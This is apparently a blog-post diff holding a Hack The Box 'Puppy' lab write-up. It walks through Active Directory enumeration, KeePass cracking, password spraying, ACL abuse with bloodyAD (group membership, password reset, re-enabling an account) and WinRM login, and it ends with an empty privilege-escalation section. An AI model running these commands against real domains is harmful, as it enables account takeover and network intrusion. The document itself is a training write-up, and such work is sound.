@@ -1,0 +1,248 @@
+---
+title: HTB - Puppy (Medium)
+date: '2025-06-05'
+tags: ['machine', 'windows', 'Active Directory', 'GenericAll', 'Shadow-Credentials', 'time-skew', 'ESC16']
+draft: false
+summary:  Placeholder   
+---
+
+<TOCInline toc={props.toc} asDisclosure />
+
+> [!NOTE]
+> Given Credentials -> `levi.james:KingofAkron2025!`
+
+## Scanning
+
+```
+❯ nmap -sV -sC -v -Pn 10.10.11.70
+
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-05 11:25 +08
+NSE: Loaded 156 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 11:25
+Completed NSE at 11:25, 0.00s elapsed
+Initiating NSE at 11:25
+Completed NSE at 11:25, 0.00s elapsed
+Initiating NSE at 11:25
+Completed NSE at 11:25, 0.00s elapsed
+Initiating Parallel DNS resolution of 1 host. at 11:25
+Completed Parallel DNS resolution of 1 host. at 11:25, 0.01s elapsed
+Initiating Connect Scan at 11:25
+Scanning 10.10.11.70 [1000 ports]
+Discovered open port 135/tcp on 10.10.11.70
+Discovered open port 53/tcp on 10.10.11.70
+Discovered open port 139/tcp on 10.10.11.70
+Discovered open port 445/tcp on 10.10.11.70
+Discovered open port 111/tcp on 10.10.11.70
+Discovered open port 636/tcp on 10.10.11.70
+Discovered open port 3268/tcp on 10.10.11.70
+Discovered open port 3269/tcp on 10.10.11.70
+Discovered open port 464/tcp on 10.10.11.70
+Discovered open port 3260/tcp on 10.10.11.70
+Discovered open port 593/tcp on 10.10.11.70
+Discovered open port 2049/tcp on 10.10.11.70
+Discovered open port 389/tcp on 10.10.11.70
+Discovered open port 88/tcp on 10.10.11.70
+Completed Connect Scan at 11:25, 4.55s elapsed (1000 total ports)
+Initiating Service scan at 11:25
+Scanning 14 services on 10.10.11.70
+Completed Service scan at 11:27, 119.33s elapsed (14 services on 1 host)
+NSE: Script scanning 10.10.11.70.
+Initiating NSE at 11:27
+Completed NSE at 11:27, 40.13s elapsed
+Initiating NSE at 11:27
+Completed NSE at 11:28, 14.97s elapsed
+Initiating NSE at 11:28
+Completed NSE at 11:28, 0.00s elapsed
+Nmap scan report for 10.10.11.70
+Host is up (0.023s latency).
+Not shown: 986 filtered tcp ports (no-response)
+Bug in iscsi-info: no string output.
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-05 10:03:57Z)
+111/tcp  open  rpcbind       2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/tcp6  rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  2,3,4        111/udp6  rpcbind
+|   100003  2,3         2049/udp   nfs
+|   100003  2,3         2049/udp6  nfs
+|   100005  1,2,3       2049/udp   mountd
+|   100005  1,2,3       2049/udp6  mountd
+|   100021  1,2,3,4     2049/tcp   nlockmgr
+|   100021  1,2,3,4     2049/tcp6  nlockmgr
+|   100021  1,2,3,4     2049/udp   nlockmgr
+|   100021  1,2,3,4     2049/udp6  nlockmgr
+|   100024  1           2049/tcp   status
+|   100024  1           2049/tcp6  status
+|   100024  1           2049/udp   status
+|_  100024  1           2049/udp6  status
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+2049/tcp open  nlockmgr      1-4 (RPC #100021)
+3260/tcp open  iscsi?
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2025-06-05T10:05:52
+|_  start_date: N/A
+|_clock-skew: 6h38m38s
+
+NSE: Script Post-scanning.
+Initiating NSE at 11:28
+Completed NSE at 11:28, 0.00s elapsed
+Initiating NSE at 11:28
+Completed NSE at 11:28, 0.00s elapsed
+Initiating NSE at 11:28
+Completed NSE at 11:28, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 179.38 seconds
+```
+
+Scanning shows we are dealing with AD. Like always, let's start enumerating SMB with the given credentials
+
+---
+
+## Enumerating
+
+```
+❯ nxc smb 10.10.11.70 -u 'levi.james' -p 'KingofAkron2025!' --shares
+❯ nxc smb 10.10.11.70 -u 'levi.james' -p 'KingofAkron2025!' --users
+```
+
+![Description](/static/images/htb/windows/puppy/1.jpg)
+
+We can see a few users there, write them down in a file called `users.txt`, we don't have any permission to any of the non-default share.
+
+---
+
+## Bloodhound
+
+With credentials given, we can gain situational awareness by gathering Bloodhound data.
+
+```
+❯ nxc ldap 10.10.11.70 -u 'levi.james' -p 'KingofAkron2025!' --dns-server 10.10.11.70 --bloodhound --collection All
+```
+
+![Description](/static/images/htb/windows/puppy/2.jpg)
+
+![Description](/static/images/htb/windows/puppy/3.jpg)
+
+Observe `levi.james` has `GenericWrite` ACE over the `Developers` group, we can add him into the group.
+
+```
+❯ bloodyAD --host "puppy.htb" -u "levi.james" -p 'KingofAkron2025!' add groupMember "Developers" "levi.james"
+```
+
+![Description](/static/images/htb/windows/puppy/4.jpg)
+
+Now we-renumerate
+
+---
+
+## Enumerating part 2
+
+![Description](/static/images/htb/windows/puppy/5.jpg)
+
+`levi.james` now has `READ` access to the `DEV` share. 
+
+![Description](/static/images/htb/windows/puppy/6.jpg)
+
+Connecting to the share, reveals a Keepass Database file. This can easily be bruteforced using an updated tool of [keepass2john](https://github.com/r3nt0n/keepass4brute)
+
+![Description](/static/images/htb/windows/puppy/7.jpg)
+
+Password found. The database itself reveals the credentials of the available users. Save them in a file called `passwords.txt`
+
+![Description](/static/images/htb/windows/puppy/8.jpg)
+
+Spray and Pray
+
+```
+❯ nxc smb 10.10.11.70 -u users.txt -p passwords.txt --shares --continue-on-success
+```
+
+![Description](/static/images/htb/windows/puppy/9.jpg)
+
+We have a hit on `ant.edwards:Antman2025!`
+
+Continue to enumerate
+
+![Description](/static/images/htb/windows/puppy/11.jpg)
+
+we have `WRITE` access now, but that won't help much. Proceed analysing Bloodhound on the new user
+
+![Description](/static/images/htb/windows/puppy/12.jpg)
+
+Observe that `ant.edwards` is a member of the `Senior Devs` group which has `GenericAll` ACE over `adam.silver`. With this ACE, we can easily change the target's password
+
+```
+❯ bloodyAD --host "puppy.htb" -u "ant.edwards" -p 'Antman2025!' set password 'adam.silver' 'Password123!'
+```
+
+![Description](/static/images/htb/windows/puppy/13.jpg)
+
+---
+
+## Gaining Access
+
+`adam.silver` is also a part of the WinRM group, we should be able to remotely access his account
+
+![Description](/static/images/htb/windows/puppy/14.jpg)
+
+But, there was a problem. I couldn't `evil-winrm` into his account for some reason. Then I tried enumerating for shares to verify the password change and the
+`STATUS_ACCOUNT_DISABLED` error came up. Apparently, we have to activate his account first.
+
+![Description](/static/images/htb/windows/puppy/15.jpg)
+
+> [!TIP]
+> https://adminions.ca/books/active-directory-enumeration-and-exploitation/page/bloodyad#bkmrk-enable-a-disabled-ac
+
+Now we enable it
+
+```
+❯ bloodyAD --host "puppy.htb" -u "ant.edwards" -p 'Antman2025!' remove uac adam.silver -f ACCOUNTDISABLE
+```
+
+![Description](/static/images/htb/windows/puppy/16.jpg)
+
+Now, we access his account and get the user flag
+
+```
+❯ evil-winrm -i 10.10.11.70 -u adam.silver -p Password123!
+```
+
+![Description](/static/images/htb/windows/puppy/17.jpg)
+
+---
+
+## Privilege Escalation
+
+
+
+
+
+
+
+
+
+
+
+
+
